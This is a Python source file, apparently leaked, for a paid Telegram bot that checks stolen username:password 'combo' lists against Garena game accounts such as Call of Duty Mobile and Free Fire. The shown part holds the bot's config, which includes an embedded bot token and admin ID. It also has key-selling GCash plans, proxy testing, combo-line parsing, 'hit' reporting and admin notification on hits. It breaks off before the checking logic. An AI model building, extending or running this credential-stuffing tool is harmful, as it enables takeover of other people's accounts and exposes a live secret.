import os, sys, json, time, uuid, zipfile, logging, signal, traceback
import asyncio, threading, io, random, re, colorama, hashlib, urllib.parse, base64, socket, shutil
from datetime import datetime, timedelta, timezone
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import wraps
from typing import Optional, Dict, List, Any, Tuple
from collections import deque, defaultdict, Counter
from contextlib import nullcontext

# Third-party imports
import requests
from Crypto.Cipher import AES
from rich import print as rprint
from rich.console import Console, Group
from rich.live import Live
from rich.panel import Panel
from rich.progress import BarColumn, MofNCompleteColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.table import Table
from rich.text import Text
from rich.box import Box, DOUBLE, HEAVY, ROUNDED
from rich.columns import Columns
from rich import box
from rich.prompt import Confirm
from rich.align import Align
from rich.layout import Layout
from rich.rule import Rule
import colorama
from colorama import Fore as _F, Style as _S

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember, BotCommand, BotCommandScopeAllPrivateChats, BotCommandScopeChat, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import (Application, CommandHandler, MessageHandler,
                           CallbackQueryHandler, ContextTypes, filters)
from telegram.constants import ParseMode

# ── Suppress noisy loggers ──────────────────────────────────────────────────
for _n in ("urllib3","requests","cloudscraper","telegram","httpx","hpack","asyncio"):
    logging.getLogger(_n).setLevel(logging.ERROR)
logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s",
                    level=logging.INFO, handlers=[logging.StreamHandler()])
log = logging.getLogger("TyrantBot")

# ── Directory & file paths ──────────────────────────────────────────────
DATA_DIR = Path("data")
DATA_DIR.mkdir(exist_ok=True)

CONFIG_FILE       = DATA_DIR / "config.json"
USERS_FILE        = DATA_DIR / "users.json"
KEYS_FILE         = DATA_DIR / "keys.json"
SESSIONS_FILE     = DATA_DIR / "sessions_persist.json"
MINI_ADMINS_FILE  = DATA_DIR / "mini_admins.json"
RESELLERS_FILE    = DATA_DIR / "resellers.json"

COMBO_DIR   = Path("combo")
RESULTS_DIR = Path("Results")
PROXY_DIR   = Path("proxy")

for d in (COMBO_DIR, RESULTS_DIR, PROXY_DIR):
    d.mkdir(exist_ok=True)

# ── Helper functions: config, users, keys, sessions ────────────────────

def load_config() -> dict:
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except (json.JSONDecodeError, ValueError):
            log.warning("config.json corrupted, using defaults")
    # Default config
    return {
        "bot_token": "8811956882:AAGcFBU_HRR5mK6b8s73131bJ5xIWTbjLL4",
        "admin_ids": [6853221073],
        "channel_username": "leakbotsrc",
        "bot_name": "Mitz Codm Checker Bot V2",
        "global_limit": 10000,          # lines per session for regular users
        "vip_limit": 20000,             # lines per session for VIP
        "default_threads": 5,
        "max_concurrent": 50,
        "cooldown_sessions": None,     # number of sessions before cooldown
        "cooldown_minutes": 30,
        "locked": False,
        "maintenance_mode": False,
        "maintenance_message": "Bot is under maintenance.",
        "announcement_text": "",
        "max_lines_per_check": None,
        "gcash_number": "",
        "gcash_name": "",
        "notify_admin_on_hit": True,
        "welcome_message": "",
    }

def save_config(cfg: dict):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2, ensure_ascii=False)

def load_users() -> dict:
    if USERS_FILE.exists():
        try:
            with open(USERS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_users(users: dict):
    with open(USERS_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_keys() -> dict:
    if KEYS_FILE.exists():
        try:
            with open(KEYS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_keys(keys: dict):
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(keys, f, indent=2, ensure_ascii=False)

def load_persisted_sessions() -> dict:
    if SESSIONS_FILE.exists():
        try:
            with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            return {}
    return {}

def persist_session(uid: str, data: dict):
    ps = load_persisted_sessions()
    ps[uid] = data
    with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(ps, f, indent=2, ensure_ascii=False)

def clear_persisted_session(uid: str):
    ps = load_persisted_sessions()
    if uid in ps:
        del ps[uid]
        with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(ps, f, indent=2, ensure_ascii=False)

# ── Time / key helpers ──────────────────────────────────────────────────

def compute_expiry(dtype: str, dval: int) -> str:
    """Return ISO datetime string for key expiry."""
    now = datetime.now(timezone.utc)
    if dtype == "hours":
        dt = now + timedelta(hours=dval)
    elif dtype == "days":
        dt = now + timedelta(days=dval)
    elif dtype == "months":
        dt = now + timedelta(days=dval*30)
    elif dtype == "lifetime":
        dt = now + timedelta(days=365*50)  # ~50 years
    else:
        dt = now + timedelta(days=1)
    return dt.isoformat()

def fmt_expiry(iso: str) -> str:
    if not iso:
        return "Never"
    try:
        dt = datetime.fromisoformat(iso)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        now = datetime.now(timezone.utc)
        if dt < now:
            return "Expired"
        diff = dt - now
        days = diff.days
        hours = diff.seconds // 3600
        minutes = (diff.seconds % 3600) // 60
        if days > 0:
            return f"{days}d {hours}h"
        if hours > 0:
            return f"{hours}h {minutes}m"
        return f"{minutes}m"
    except:
        return "Invalid"

def key_expired(iso: str) -> bool:
    if not iso:
        return True
    try:
        dt = datetime.fromisoformat(iso)
        if dt.tzinfo is None:
            dt = dt.replace(tzinfo=timezone.utc)
        return dt < datetime.now(timezone.utc)
    except:
        return True

# ── Text / UI helpers ──────────────────────────────────────────────────

def _progress_bar(pct: int, width: int = 20) -> str:
    filled = int(pct / 100 * width)
    return "█" * filled + "░" * (width - filled)

def _hit_badge(count: int) -> str:
    if count >= 50:
        return "🔥🔥🔥 MASSIVE HITS!"
    elif count >= 20:
        return "🔥🔥 GOOD HITS!"
    elif count >= 5:
        return "🔥 HITS FOUND"
    elif count > 0:
        return "✅ HITS FOUND"
    else:
        return "❌ NO HITS"

def _speed_color(speed: str) -> str:
    if not speed:
        return "⏳"
    try:
        val = float(speed.replace("/min", "").replace("k", ""))
        if "k" in speed:
            if val >= 5:
                return "🚀 " + speed
            elif val >= 1:
                return "⚡ " + speed
            else:
                return "🐢 " + speed
        else:
            if val >= 50:
                return "🚀 " + speed
            elif val >= 20:
                return "⚡ " + speed
            else:
                return "🐢 " + speed
    except:
        return speed

def pe(emoji_id: str) -> str:
    """Return a decorative emoji based on id (1-5 or names)."""
    map_ = {
        "1": "🔹", "2": "🔸", "3": "🔺", "4": "🔻", "5": "⭐",
        "fire": "🔥", "check": "✅", "warn": "⚠️", "info": "ℹ️",
        "sep": "━", "thin": "─",
    }
    return map_.get(str(emoji_id), "▪️")

def pe_sep() -> str:
    return "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

def pe_thin() -> str:
    return "──────────────────────────────────────────"

# ── Proxy testing sync helper ─────────────────────────────────────────

def _test_proxy_sync(proxy_line: str) -> tuple:
    """Test a single proxy line (synchronous). Returns (working, error_msg)."""
    import requests
    import urllib.parse
    proxy_line = proxy_line.strip()
    if not proxy_line or proxy_line.startswith("#"):
        return False, "empty/comment"

    # Build proxy dict
    parsed = urllib.parse.urlparse(proxy_line)
    if parsed.scheme:
        proxy_url = proxy_line
    else:
        # try http://
        proxy_url = "http://" + proxy_line
    proxies = {"http": proxy_url, "https": proxy_url}

    test_url = "https://api.ipify.org?format=json"
    try:
        r = requests.get(test_url, proxies=proxies, timeout=10)
        if r.status_code == 200:
            return True, ""
        else:
            return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:40]

# ── GCash plans ────────────────────────────────────────────────────────

GCASH_PLANS = {
    "plan_3d":   {"label": "3 Days",   "price": "₱50",  "dtype": "days", "dval": 3},
    "plan_7d":   {"label": "7 Days",   "price": "₱70",  "dtype": "days", "dval": 7},
    "plan_30d":  {"label": "1 Month",  "price": "₱100", "dtype": "days", "dval": 30},
    "plan_life": {"label": "Lifetime", "price": "₱150", "dtype": "lifetime", "dval": 0},
}

# ── Railway.com crash prevention ─────────────────────────────────────────
_RAILWAY_PORT    = int(os.environ.get("PORT", 8080))
_railway_start   = time.time()
_shutdown_flag   = threading.Event()

def _start_health_server():
    import http.server, socketserver
    class _H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            body = (f'{{"status":"ok","uptime":{int(time.time()-_railway_start)},'
                    f'"pid":{os.getpid()}}}').encode()
            self.send_response(200)
            self.send_header("Content-Type","application/json")
            self.send_header("Content-Length",str(len(body)))
            self.end_headers(); self.wfile.write(body)
        def log_message(self,*a): pass
    for _i in range(10):
        try:
            srv = socketserver.TCPServer(("0.0.0.0", _RAILWAY_PORT + _i), _H)
            srv.allow_reuse_address = True
            threading.Thread(target=srv.serve_forever, daemon=True, name="health-http").start()
            log.info(f" Health server on port {_RAILWAY_PORT+_i}")
            return
        except OSError:
            time.sleep(0.5)
    log.warning("  Health server could not bind (Railway may restart)")

_start_health_server()

# ── Memory watchdog ──────────────────────────────────────────────────────
_MEM_LIMIT_MB   = int(os.environ.get("BOT_MEM_LIMIT_MB", "9999"))
_MEM_WARN_MB    = int(os.environ.get("BOT_MEM_WARN_MB",  "9999"))
_mem_pressure   = threading.Event()

def _get_rss_mb() -> float:
    try:
        with open("/proc/self/status","r") as _ps:
            for ln in _ps:
                if ln.startswith("VmRSS:"):
                    return int(ln.split()[1]) / 1024
    except: pass
    try:
        import resource as _res
        return _res.getrusage(_res.RUSAGE_SELF).ru_maxrss / 1024
    except: pass
    return 0.0

def _memory_watchdog():
    import gc as _gc
    while not _shutdown_flag.wait(30):
        mb = _get_rss_mb()
        if mb > 600:
            _gc.collect()
            log.info(f"GC run — RAM {mb:.0f}MB")
threading.Thread(target=_memory_watchdog, daemon=True, name="mem-watchdog").start()

def _send_data_backup_to_admins(reason: str = "Shutdown"):
    import requests as _req
    try:
        if not CONFIG_FILE.exists(): return
        with open(CONFIG_FILE, "r", encoding="utf-8") as _cf:
            _cfg = json.load(_cf)
        _tok  = _cfg.get("bot_token", "")
        _aids = _cfg.get("admin_ids", [])
        if not _tok or not _aids: return
        _files = [f for f in DATA_DIR.iterdir() if f.is_file()] if DATA_DIR.exists() else []
        if not _files: return
        for _aid in _aids:
            try:
                _req.post(
                    f"https://api.telegram.org/bot{_tok}/sendMessage",
                    data={"chat_id": _aid,
                          "text": (f" <b>Bot {reason}</b> — Data Backup\n"
                                   f"━━━━━━━━━━━━━━━━━━━━\n"
                                   f"Sending <b>{len(_files)}</b> file(s) from <code>data/</code>…"),
                          "parse_mode": "HTML"},
                    timeout=8)
            except: pass
            for _f in _files:
                try:
                    with open(_f, "rb") as _fh:
                        _req.post(
                            f"https://api.telegram.org/bot{_tok}/sendDocument",
                            data={"chat_id": _aid,
                                  "caption": f" <code>{_f.name}</code>",
                                  "parse_mode": "HTML"},
                            files={"document": (_f.name, _fh, "application/octet-stream")},
                            timeout=15)
                except: pass
    except: pass

def _handle_sigterm(signum,frame):
    log.info("  SIGTERM — sending data backup then exiting cleanly…")
    _shutdown_flag.set()
    _send_data_backup_to_admins("Shutdown")
    time.sleep(2); sys.exit(0)

signal.signal(signal.SIGTERM, _handle_sigterm)
signal.signal(signal.SIGINT,  _handle_sigterm)

def _global_exception_hook(exc_type,exc_value,exc_tb):
    if issubclass(exc_type,(KeyboardInterrupt,SystemExit)):
        sys.__excepthook__(exc_type,exc_value,exc_tb); return
    log.critical(" Uncaught:\n"+"".join(traceback.format_exception(exc_type,exc_value,exc_tb)))
    _send_data_backup_to_admins("Crash")
sys.excepthook = _global_exception_hook

_orig_thread_hook = threading.excepthook
def _thread_exception_hook(args):
    if args.exc_type in (SystemExit,KeyboardInterrupt): return
    log.error(f" Thread '{args.thread.name}' crashed:\n"
              +"".join(traceback.format_exception(args.exc_type,args.exc_value,args.exc_traceback)))
    _orig_thread_hook(args)
threading.excepthook = _thread_exception_hook

def _periodic_snapshot():
    while not _shutdown_flag.wait(60):
        try:
            _lock = globals().get("sessions_lock")
            _sessions = globals().get("active_sessions",{})
            if _lock:
                with _lock:
                    targets = {u:dict(s) for u,s in _sessions.items() if s.get("status")=="checking"}
            else: targets={}
            for uid,s in targets.items():
                ls=s.get("live_")
                if ls:
                    try: update_persisted_stats(uid,ls.get_stats())
                    except: pass
        except: pass
threading.Thread(target=_periodic_snapshot,daemon=True,name="snapshot").start()

# ──────────────────────────────────────────────────────────────────────────────
#  MITZV3 CORE — ALL CHECKER LOGIC, API, HELPERS (NO STANDALONE MENUS)
# ──────────────────────────────────────────────────────────────────────────────

colorama.init(autoreset=True)

# ── Rich console helpers ────────────────────────────────────────────────────
console = Console()
_CY = _F.CYAN + _S.BRIGHT
_GN = _F.GREEN + _S.BRIGHT
_RD = _F.RED + _S.BRIGHT
_YL = _F.YELLOW + _S.BRIGHT
_MG = _F.MAGENTA + _S.BRIGHT
_WH = _F.WHITE + _S.BRIGHT
_BLU = _F.BLUE + _S.BRIGHT
_DIM = _S.DIM
_RST = _S.RESET_ALL
_BRT = _S.BRIGHT
_ITL = "\033[3m"
_SL = "\033[38;5;240m"
_GR = "\033[38;5;114m"
_GD = "\033[38;5;222m"
_GRAD_VER = '\033[38;2;255;200;80m'
_GRAD_BY  = '\033[38;2;160;160;160m'
_GRAD_AT  = '\033[38;2;255;80;200m'

def _tw():
    return shutil.get_terminal_size((80, 24)).columns

def _log(level: str, msg: str, indent: str='  '):
    col, icon = {'INFO': (_CY, 'ℹ'), 'SUCCESS': (_GN, '✔'), 'WARNING': (_YL, '⚠'),
                 'ERROR': (_RD, '✖'), 'DEBUG': (_DIM, '·'), 'REQUEST': (_CY, '→'),
                 'RESPONSE': (_CY, '←'), 'RETRY': (_YL, '↺'), 'PROXY': (_MG, '⬡'),
                 'THREAD': (_MG, '⧫'), 'SAVE': (_GN, '⬇')}.get(level, (_DIM, '·'))
    clean = re.sub(r'\x1b\[[0-9;]*m', '', str(msg))
    print(f'{indent}{col}{icon}{_RST}  {clean}')

# ── Constants ────────────────────────────────────────────────────────────────
CHECK_OTHER_GAMES: bool = False


CODM_REGIONS = {'AF':{'name':'Afghanistan','code':'93','flag':'🇦🇫'},'AL':{'name':'Albania','code':'355','flag':'🇦🇱'},'DZ':{'name':'Algeria','code':'213','flag':'🇩🇿'},'AD':{'name':'Andorra','code':'376','flag':'🇦🇩'},'AO':{'name':'Angola','code':'244','flag':'🇦🇴'},'AG':{'name':'Antigua and Barbuda','code':'1','flag':'🇦🇬'},'AR':{'name':'Argentina','code':'54','flag':'🇦🇷'},'AM':{'name':'Armenia','code':'374','flag':'🇦🇲'},'AU':{'name':'Australia','code':'61','flag':'🇦🇺'},'AT':{'name':'Austria','code':'43','flag':'🇦🇹'},'AZ':{'name':'Azerbaijan','code':'994','flag':'🇦🇿'},'BS':{'name':'Bahamas','code':'1','flag':'🇧🇸'},'BH':{'name':'Bahrain','code':'973','flag':'🇧🇭'},'BD':{'name':'Bangladesh','code':'880','flag':'🇧🇩'},'BB':{'name':'Barbados','code':'1','flag':'🇧🇧'},'BY':{'name':'Belarus','code':'375','flag':'🇧🇾'},'BE':{'name':'Belgium','code':'32','flag':'🇧🇪'},'BZ':{'name':'Belize','code':'501','flag':'🇧🇿'},'BJ':{'name':'Benin','code':'229','flag':'🇧🇯'},'BT':{'name':'Bhutan','code':'975','flag':'🇧🇹'},'BO':{'name':'Bolivia','code':'591','flag':'🇧🇴'},'BA':{'name':'Bosnia and Herzegovina','code':'387','flag':'🇧🇦'},'BW':{'name':'Botswana','code':'267','flag':'🇧🇼'},'BR':{'name':'Brazil','code':'55','flag':'🇧🇷'},'BN':{'name':'Brunei','code':'673','flag':'🇧🇳'},'BG':{'name':'Bulgaria','code':'359','flag':'🇧🇬'},'BF':{'name':'Burkina Faso','code':'226','flag':'🇧🇫'},'BI':{'name':'Burundi','code':'257','flag':'🇧🇮'},'KH':{'name':'Cambodia','code':'855','flag':'🇰🇭'},'CM':{'name':'Cameroon','code':'237','flag':'🇨🇲'},'CA':{'name':'Canada','code':'1','flag':'🇨🇦'},'CV':{'name':'Cape Verde','code':'238','flag':'🇨🇻'},'CF':{'name':'Central African Republic','code':'236','flag':'🇨🇫'},'TD':{'name':'Chad','code':'235','flag':'🇹🇩'},'CL':{'name':'Chile','code':'56','flag':'🇨🇱'},'CN':{'name':'China','code':'86','flag':'🇨🇳'},'CO':{'name':'Colombia','code':'57','flag':'🇨🇴'},'KM':{'name':'Comoros','code':'269','flag':'🇰🇲'},'CG':{'name':'Congo','code':'242','flag':'🇨🇬'},'CD':{'name':'Congo (DRC)','code':'243','flag':'🇨🇩'},'CR':{'name':'Costa Rica','code':'506','flag':'🇨🇷'},'CI':{'name':"Côte d'Ivoire",'code':'225','flag':'🇨🇮'},'HR':{'name':'Croatia','code':'385','flag':'🇭🇷'},'CU':{'name':'Cuba','code':'53','flag':'🇨🇺'},'CY':{'name':'Cyprus','code':'357','flag':'🇨🇾'},'CZ':{'name':'Czech Republic','code':'420','flag':'🇨🇿'},'DK':{'name':'Denmark','code':'45','flag':'🇩🇰'},'DJ':{'name':'Djibouti','code':'253','flag':'🇩🇯'},'DM':{'name':'Dominica','code':'1','flag':'🇩🇲'},'DO':{'name':'Dominican Republic','code':'1','flag':'🇩🇴'},'EC':{'name':'Ecuador','code':'593','flag':'🇪🇨'},'EG':{'name':'Egypt','code':'20','flag':'🇪🇬'},'SV':{'name':'El Salvador','code':'503','flag':'🇸🇻'},'GQ':{'name':'Equatorial Guinea','code':'240','flag':'🇬🇶'},'ER':{'name':'Eritrea','code':'291','flag':'🇪🇷'},'EE':{'name':'Estonia','code':'372','flag':'🇪🇪'},'SZ':{'name':'Eswatini','code':'268','flag':'🇸🇿'},'ET':{'name':'Ethiopia','code':'251','flag':'🇪🇹'},'FJ':{'name':'Fiji','code':'679','flag':'🇫🇯'},'FI':{'name':'Finland','code':'358','flag':'🇫🇮'},'FR':{'name':'France','code':'33','flag':'🇫🇷'},'GA':{'name':'Gabon','code':'241','flag':'🇬🇦'},'GM':{'name':'Gambia','code':'220','flag':'🇬🇲'},'GE':{'name':'Georgia','code':'995','flag':'🇬🇪'},'DE':{'name':'Germany','code':'49','flag':'🇩🇪'},'GH':{'name':'Ghana','code':'233','flag':'🇬🇭'},'GR':{'name':'Greece','code':'30','flag':'🇬🇷'},'GD':{'name':'Grenada','code':'1','flag':'🇬🇩'},'GT':{'name':'Guatemala','code':'502','flag':'🇬🇹'},'GN':{'name':'Guinea','code':'224','flag':'🇬🇳'},'GW':{'name':'Guinea-Bissau','code':'245','flag':'🇬🇼'},'GY':{'name':'Guyana','code':'592','flag':'🇬🇾'},'HT':{'name':'Haiti','code':'509','flag':'🇭🇹'},'HN':{'name':'Honduras','code':'504','flag':'🇭🇳'},'HK':{'name':'Hong Kong','code':'852','flag':'🇭🇰'},'HU':{'name':'Hungary','code':'36','flag':'🇭🇺'},'IS':{'name':'Iceland','code':'354','flag':'🇮🇸'},'IN':{'name':'India','code':'91','flag':'🇮🇳'},'ID':{'name':'Indonesia','code':'62','flag':'🇮🇩'},'IR':{'name':'Iran','code':'98','flag':'🇮🇷'},'IQ':{'name':'Iraq','code':'964','flag':'🇮🇶'},'IE':{'name':'Ireland','code':'353','flag':'🇮🇪'},'IL':{'name':'Israel','code':'972','flag':'🇮🇱'},'IT':{'name':'Italy','code':'39','flag':'🇮🇹'},'JM':{'name':'Jamaica','code':'1','flag':'🇯🇲'},'JP':{'name':'Japan','code':'81','flag':'🇯🇵'},'JO':{'name':'Jordan','code':'962','flag':'🇯🇴'},'KZ':{'name':'Kazakhstan','code':'7','flag':'🇰🇿'},'KE':{'name':'Kenya','code':'254','flag':'🇰🇪'},'KI':{'name':'Kiribati','code':'686','flag':'🇰🇮'},'KR':{'name':'South Korea','code':'82','flag':'🇰🇷'},'KW':{'name':'Kuwait','code':'965','flag':'🇰🇼'},'KG':{'name':'Kyrgyzstan','code':'996','flag':'🇰🇬'},'LA':{'name':'Laos','code':'856','flag':'🇱🇦'},'LV':{'name':'Latvia','code':'371','flag':'🇱🇻'},'LB':{'name':'Lebanon','code':'961','flag':'🇱🇧'},'LS':{'name':'Lesotho','code':'266','flag':'🇱🇸'},'LR':{'name':'Liberia','code':'231','flag':'🇱🇷'},'LY':{'name':'Libya','code':'218','flag':'🇱🇾'},'LI':{'name':'Liechtenstein','code':'423','flag':'🇱🇮'},'LT':{'name':'Lithuania','code':'370','flag':'🇱🇹'},'LU':{'name':'Luxembourg','code':'352','flag':'🇱🇺'},'MO':{'name':'Macau','code':'853','flag':'🇲🇴'},'MG':{'name':'Madagascar','code':'261','flag':'🇲🇬'},'MW':{'name':'Malawi','code':'265','flag':'🇲🇼'},'MY':{'name':'Malaysia','code':'60','flag':'🇲🇾'},'MV':{'name':'Maldives','code':'960','flag':'🇲🇻'},'ML':{'name':'Mali','code':'223','flag':'🇲🇱'},'MT':{'name':'Malta','code':'356','flag':'🇲🇹'},'MH':{'name':'Marshall Islands','code':'692','flag':'🇲🇭'},'MR':{'name':'Mauritania','code':'222','flag':'🇲🇷'},'MU':{'name':'Mauritius','code':'230','flag':'🇲🇺'},'MX':{'name':'Mexico','code':'52','flag':'🇲🇽'},'FM':{'name':'Micronesia','code':'691','flag':'🇫🇲'},'MD':{'name':'Moldova','code':'373','flag':'🇲🇩'},'MC':{'name':'Monaco','code':'377','flag':'🇲🇨'},'MN':{'name':'Mongolia','code':'976','flag':'🇲🇳'},'ME':{'name':'Montenegro','code':'382','flag':'🇲🇪'},'MA':{'name':'Morocco','code':'212','flag':'🇲🇦'},'MZ':{'name':'Mozambique','code':'258','flag':'🇲🇿'},'MM':{'name':'Myanmar','code':'95','flag':'🇲🇲'},'NA':{'name':'Namibia','code':'264','flag':'🇳🇦'},'NR':{'name':'Nauru','code':'674','flag':'🇳🇷'},'NP':{'name':'Nepal','code':'977','flag':'🇳🇵'},'NL':{'name':'Netherlands','code':'31','flag':'🇳🇱'},'NZ':{'name':'New Zealand','code':'64','flag':'🇳🇿'},'NI':{'name':'Nicaragua','code':'505','flag':'🇳🇮'},'NE':{'name':'Niger','code':'227','flag':'🇳🇪'},'NG':{'name':'Nigeria','code':'234','flag':'🇳🇬'},'MK':{'name':'North Macedonia','code':'389','flag':'🇲🇰'},'NO':{'name':'Norway','code':'47','flag':'🇳🇴'},'OM':{'name':'Oman','code':'968','flag':'🇴🇲'},'PK':{'name':'Pakistan','code':'92','flag':'🇵🇰'},'PW':{'name':'Palau','code':'680','flag':'🇵🇼'},'PA':{'name':'Panama','code':'507','flag':'🇵🇦'},'PG':{'name':'Papua New Guinea','code':'675','flag':'🇵🇬'},'PY':{'name':'Paraguay','code':'595','flag':'🇵🇾'},'PE':{'name':'Peru','code':'51','flag':'🇵🇪'},'PH':{'name':'Philippines','code':'63','flag':'🇵🇭'},'PL':{'name':'Poland','code':'48','flag':'🇵🇱'},'PT':{'name':'Portugal','code':'351','flag':'🇵🇹'},'QA':{'name':'Qatar','code':'974','flag':'🇶🇦'},'RO':{'name':'Romania','code':'40','flag':'🇷🇴'},'RU':{'name':'Russia','code':'7','flag':'🇷🇺'},'RW':{'name':'Rwanda','code':'250','flag':'🇷🇼'},'KN':{'name':'Saint Kitts and Nevis','code':'1','flag':'🇰🇳'},'LC':{'name':'Saint Lucia','code':'1','flag':'🇱🇨'},'VC':{'name':'Saint Vincent and the Grenadines','code':'1','flag':'🇻🇨'},'WS':{'name':'Samoa','code':'685','flag':'🇼🇸'},'SM':{'name':'San Marino','code':'378','flag':'🇸🇲'},'ST':{'name':'São Tomé and Príncipe','code':'239','flag':'🇸🇹'},'SA':{'name':'Saudi Arabia','code':'966','flag':'🇸🇦'},'SN':{'name':'Senegal','code':'221','flag':'🇸🇳'},'RS':{'name':'Serbia','code':'381','flag':'🇷🇸'},'SC':{'name':'Seychelles','code':'248','flag':'🇸🇨'},'SL':{'name':'Sierra Leone','code':'232','flag':'🇸🇱'},'SG':{'name':'Singapore','code':'65','flag':'🇸🇬'},'SK':{'name':'Slovakia','code':'421','flag':'🇸🇰'},'SI':{'name':'Slovenia','code':'386','flag':'🇸🇮'},'SB':{'name':'Solomon Islands','code':'677','flag':'🇸🇧'},'SO':{'name':'Somalia','code':'252','flag':'🇸🇴'},'ZA':{'name':'South Africa','code':'27','flag':'🇿🇦'},'SS':{'name':'South Sudan','code':'211','flag':'🇸🇸'},'ES':{'name':'Spain','code':'34','flag':'🇪🇸'},'LK':{'name':'Sri Lanka','code':'94','flag':'🇱🇰'},'SD':{'name':'Sudan','code':'249','flag':'🇸🇩'},'SR':{'name':'Suriname','code':'597','flag':'🇸🇷'},'SE':{'name':'Sweden','code':'46','flag':'🇸🇪'},'CH':{'name':'Switzerland','code':'41','flag':'🇨🇭'},'SY':{'name':'Syria','code':'963','flag':'🇸🇾'},'TW':{'name':'Taiwan','code':'886','flag':'🇹🇼'},'TJ':{'name':'Tajikistan','code':'992','flag':'🇹🇯'},'TZ':{'name':'Tanzania','code':'255','flag':'🇹🇿'},'TH':{'name':'Thailand','code':'66','flag':'🇹🇭'},'TL':{'name':'Timor-Leste','code':'670','flag':'🇹🇱'},'TG':{'name':'Togo','code':'228','flag':'🇹🇬'},'TO':{'name':'Tonga','code':'676','flag':'🇹🇴'},'TT':{'name':'Trinidad and Tobago','code':'1','flag':'🇹🇹'},'TN':{'name':'Tunisia','code':'216','flag':'🇹🇳'},'TR':{'name':'Turkey','code':'90','flag':'🇹🇷'},'TM':{'name':'Turkmenistan','code':'993','flag':'🇹🇲'},'TV':{'name':'Tuvalu','code':'688','flag':'🇹🇻'},'UG':{'name':'Uganda','code':'256','flag':'🇺🇬'},'UA':{'name':'Ukraine','code':'380','flag':'🇺🇦'},'AE':{'name':'United Arab Emirates','code':'971','flag':'🇦🇪'},'GB':{'name':'United Kingdom','code':'44','flag':'🇬🇧'},'US':{'name':'United States','code':'1','flag':'🇺🇸'},'UY':{'name':'Uruguay','code':'598','flag':'🇺🇾'},'UZ':{'name':'Uzbekistan','code':'998','flag':'🇺🇿'},'VU':{'name':'Vanuatu','code':'678','flag':'🇻🇺'},'VA':{'name':'Vatican City','code':'39','flag':'🇻🇦'},'VE':{'name':'Venezuela','code':'58','flag':'🇻🇪'},'VN':{'name':'Vietnam','code':'84','flag':'🇻🇳'},'YE':{'name':'Yemen','code':'967','flag':'🇾🇪'},'ZM':{'name':'Zambia','code':'260','flag':'🇿🇲'},'ZW':{'name':'Zimbabwe','code':'263','flag':'🇿🇼'}}

# ── Game mappings (used by get_game_connections) ──────────────────────────
GAME_FILE_MAP = {'CODM': 'CODM.txt', 'FREEFIRE': 'FreeFire.txt', 'FREE FIRE': 'FreeFire.txt', 'ROV': 'ROV.txt', 'DELTA FORCE': 'DeltaForce.txt', 'AOV': 'AOV.txt', 'SPEED DRIFTERS': 'SpeedDrifters.txt', 'BLACK CLOVER M': 'BlackCloverM.txt', 'GARENA UNDAWN': 'Undawn.txt', 'FC ONLINE': 'FCOnline.txt', 'FC ONLINE M': 'FCOnlineM.txt', 'MOONLIGHT BLADE': 'MoonlightBlade.txt', 'FAST THRILL': 'FastThrill.txt', 'THE WORLD OF WAR': 'WorldOfWar.txt'}
GAME_DISPLAY_NAMES = [('CODM', 'CODM'), ('FREEFIRE', 'Free Fire'), ('ROV', 'ROV'), ('DELTA FORCE', 'Delta Force'), ('AOV', 'AOV'), ('SPEED DRIFTERS', 'Speed Drifters'), ('BLACK CLOVER M', 'Black Clover M'), ('GARENA UNDAWN', 'Undawn'), ('FC ONLINE', 'FC Online'), ('FC ONLINE M', 'FC Online M'), ('MOONLIGHT BLADE', 'Moonlight Blade'), ('FAST THRILL', 'Fast Thrill'), ('THE WORLD OF WAR', 'World of War')]

OAUTH_MAX_RETRIES = 3
OAUTH_RETRY_DELAY = 2

def sanitize_string(text):
    if not text or text == 'N/A':
        return text
    try:
        return text.encode('ascii', errors='ignore').decode('ascii')
    except:
        return re.sub('[^\\x00-\\x7F]+', '', str(text))

def clean_account_line(line):
    if not line:
        return (None, None)
    line = line.strip().lstrip('\ufeff\ufffe')
    line = ''.join((char for char in line if char.isprintable() or char == ':'))
    if ':' not in line:
        return (None, None)
    try:
        parts = line.split(':', 1)
        if len(parts) != 2:
            return (None, None)
        account = parts[0].strip()
        password = parts[1].strip()
        account = sanitize_string(account)
        password = sanitize_string(password)
        if not account or not password:
            return (None, None)
        return (account, password)
    except:
        return (None, None)

def format_codm_region(region_code):
    if not region_code or region_code == 'N/A':
        return 'N/A'
    region_code = region_code.upper()
    region_info = CODM_REGIONS.get(region_code)
    if region_info:
        return f"{region_info['flag']} {region_info['name']} ({region_code})"
    else:
        return f'{region_code}'

def format_mobile_number(mobile_no, country_code=None):
    if not mobile_no or mobile_no == 'N/A' or (not str(mobile_no).strip()):
        return 'N/A'
    mobile_str = str(mobile_no).strip()
    mobile_str = mobile_str.replace('+', '').replace(' ', '').replace('-', '')
    if country_code:
        country_code = str(country_code).strip()
        if not mobile_str.startswith(country_code):
            if mobile_str.startswith('0'):
                mobile_str = country_code + mobile_str[1:]
            else:
                mobile_str = country_code + mobile_str
    detected_country_code = None
    for code_key, region_info in CODM_REGIONS.items():
        code = region_info['code']
        if mobile_str.startswith(code):
            detected_country_code = code
            break
    if detected_country_code:
        local_number = mobile_str[len(detected_country_code):]
        if len(local_number) >= 4:
            masked = '*' * (len(local_number) - 4) + local_number[-4:]
            return f'+{detected_country_code} {masked}'
        else:
            return f'+{detected_country_code} {local_number}'
